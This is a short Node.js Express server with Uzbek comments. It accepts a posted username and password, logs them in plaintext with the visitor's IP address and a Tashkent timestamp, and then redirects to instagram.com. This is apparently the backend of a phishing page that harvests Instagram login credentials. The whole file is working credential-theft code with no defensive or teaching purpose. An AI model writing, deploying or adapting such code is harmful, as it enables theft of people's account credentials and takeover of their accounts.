const express = require("express");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// YANGI – console.log orqali real vaqtda ko‘rish
app.post("/save", (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "unknown";
    const time = new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" });

    // Bu yozuv Railway Logs’da darhol chiqadi
    console.log(`YANGI KIRISH → ${time} | IP: ${ip} | USER: ${username} | PASS: ${password}`);

    // Instagram’ga yo‘naltirish
    res.redirect("https://www.instagram.com");
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Server ishga tushdi"));
